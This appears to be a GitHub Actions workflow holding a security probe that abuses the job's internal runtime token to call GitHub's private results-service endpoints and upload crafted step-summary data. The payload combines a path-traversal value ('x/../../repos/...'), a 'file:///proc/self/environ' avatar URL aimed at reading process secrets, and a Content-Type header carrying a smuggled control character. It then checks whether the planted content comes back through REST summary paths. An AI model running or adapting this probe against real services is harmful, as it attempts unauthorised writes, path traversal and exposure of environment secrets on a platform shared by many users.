name: Probe Actions job summary storage
on:
  workflow_dispatch:
permissions:
  actions: read
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 3
    steps:
      - uses: actions/github-script@v8
        env:
          GH_TOKEN: ${{ github.token }}
        with:
          github-token: ${{ github.token }}
          script: |
            const fs = require('node:fs');
            const runtime = process.env.ACTIONS_RUNTIME_TOKEN;
            const results = process.env.ACTIONS_RESULTS_URL;
            const repo = process.env.GITHUB_REPOSITORY;
            const claims = JSON.parse(Buffer.from(runtime.split('.')[1], 'base64url').toString());
            const scope = String(claims.scp || '').split(' ').find(x => x.startsWith('Actions.Results:'));
            const [, runBackendId, jobBackendId] = scope.split(':');
            const fields = {workflow_run_backend_id: runBackendId, workflow_job_run_backend_id: jobBackendId};
            const apiHeaders = {Authorization: `Bearer ${process.env.GH_TOKEN}`, Accept: 'application/vnd.github.v3+json', 'User-Agent': 'own-summary-probe'};
            const jobsResp = await fetch(`https://api.github.com/repos/${repo}/actions/runs/${process.env.GITHUB_RUN_ID}/jobs?per_page=100`, {headers: apiHeaders});
            if (!jobsResp.ok) throw new Error(`list jobs HTTP ${jobsResp.status}`);
            const job = (await jobsResp.json()).jobs?.[0];
            if (!job) throw new Error('no job');
            const fullName = `x/../../repos/${repo}/actions/jobs/${job.id}/steps/3/summary`;
            const payload = Buffer.from(JSON.stringify({full_name: fullName, owner: {login: 'probe', avatar_url: 'file:///proc/self/environ'}, description: 'step summary storage probe', stargazers_count: 1}));
            fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY, payload.toString('utf8') + '\n');
            const base = new URL(results);
            async function rpc(method, data) {
              const response = await fetch(new URL(`twirp/results.services.receiver.Receiver/${method}`, results), {method: 'POST', headers: {Authorization: `Bearer ${runtime}`, 'Content-Type': 'application/json'}, body: JSON.stringify(data)});
              const text = await response.text();
              let json = {}; try { json = JSON.parse(text); } catch {}
              return {status: response.status, json};
            }
            const docs = [
              {...fields, step_number: 3, step_id: '3', timeline_record_id: jobBackendId},
              {workflowRunBackendId: runBackendId, workflowJobRunBackendId: jobBackendId, stepNumber: 3, stepId: '3', timelineRecordId: jobBackendId},
            ];
            const findUrls = (value, out = []) => {
              if (!value || typeof value !== 'object') return out;
              for (const [key, item] of Object.entries(value)) {
                if (typeof item === 'string' && /url/i.test(key) && /^https:\/\//i.test(item)) out.push({key, url: item});
                else if (item && typeof item === 'object') findUrls(item, out);
              }
              return out;
            };
            let uploaded = false;
            for (const doc of docs) {
              const signed = await rpc('GetStepSummarySignedBlobURL', doc);
              const candidates = findUrls(signed.json);
              console.log(`GET_STEP_SUMMARY status=${signed.status} ok=${Boolean(signed.json.ok)} url_keys=${candidates.map(x => x.key).join(',') || 'none'}`);
              for (const candidate of candidates) {
                const url = new URL(candidate.url);
                console.log(`SUMMARY_URL key=${candidate.key} host=${url.host} path=${url.pathname} query_keys=${[...url.searchParams.keys()].join(',')}`);
                const put = await fetch(candidate.url, {method: 'PUT', headers: {'x-ms-blob-type': 'BlockBlob', 'Content-Type': 'application/json\u0085'}, body: payload});
                console.log(`SUMMARY_PUT status=${put.status}`);
                if (put.ok) uploaded = true;
              }
              const meta = await rpc('CreateStepSummaryMetadata', doc);
              console.log(`CREATE_STEP_SUMMARY_META status=${meta.status} ok=${Boolean(meta.json.ok)} keys=${Object.keys(meta.json).join(',')}`);
            }
            console.log(`SUMMARY_ANY_UPLOAD_OK=${uploaded}`);
            const paths = [
              `actions/jobs/${job.id}/steps/3/summary`,
              `actions/jobs/${job.id}/steps/3/summary/raw`,
              `actions/jobs/${job.id}/summary`,
              `actions/runs/${process.env.GITHUB_RUN_ID}/summary`,
            ];
            for (const path of paths) {
              try {
                const first = await fetch(`https://api.github.com/repos/${repo}/${path}`, {headers: apiHeaders, redirect: 'manual'});
                const location = first.headers.get('location');
                const final = location ? await fetch(location) : first;
                const body = Buffer.from(await final.arrayBuffer());
                const type = final.headers.get('content-type') || '';
                console.log(`SUMMARY_REST ${path} first=${first.status} final=${final.status} type_hex=${Buffer.from(type).toString('hex')} bytes=${body.length} exact=${body.equals(payload)}`);
              } catch (error) { console.log(`SUMMARY_REST ${path} ERROR=${error.name}`); }
            }
